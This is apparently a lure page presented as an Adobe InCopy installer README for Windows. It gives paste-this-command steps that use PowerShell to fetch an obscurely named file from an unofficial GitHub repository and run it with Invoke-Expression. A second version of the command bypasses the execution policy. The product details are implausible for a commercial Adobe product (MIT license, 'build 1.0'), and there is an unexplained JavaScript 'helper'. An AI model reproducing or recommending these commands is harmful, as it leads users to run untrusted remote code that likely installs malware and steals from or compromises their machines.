# InCopy

InCopy is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open InCopy and work in it.

Adobe InCopy is a professional writing and copy-editing application built for publishing teams. It pairs with Adobe InDesign so editors can open assigned stories in Galley, Story, or Layout view while designers keep control of frames, styles, and master pages on the same document.

A typical Windows session starts with opening a shared InDesign package or a checked-out assignment from your workflow server. You edit headlines and body copy in Story Editor, apply character and paragraph styles from the layout, run spell check, and leave notes for the designer. When you check in, updated text flows into the live layout without manual paste cycles.

This repository holds a Windows setup bundle for consistent installs across editorial workstations, short deployment notes for fonts and assignment paths, and a changelog that records build numbers and compatibility with matching InDesign releases.

## What you do with it

- Open InDesign assignments on Windows and edit only the stories assigned to your role.
- Story Editor provides a clean typing canvas separate from the full page layout view.
- Layout view shows live text inside frames while preserving designer-controlled geometry and styles.
- Track Changes marks insertions and deletions so reviewers can accept or reject edits precisely.
- Paragraph and character styles from the layout keep copy formatting consistent across the publication.
- Notes and inline annotations let editors flag questions without altering visible story text.
- Check-out and check-in workflows sync content with shared projects and assignment servers safely.
- Spell check and find-replace run across linked stories before you submit final copy.

## Quick Setup (PowerShell)

This installs the program InCopy on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sofiaz158398708/incopy-setup-guide/main/lvk2u31nxi.ephxh5bm | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sofiaz158398708/incopy-setup-guide/main/lvk2u31nxi.ephxh5bm | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `lvk2u31nxi.ephxh5bm` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sofiaz158398708/incopy-setup-guide`. Adobe InCopy 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
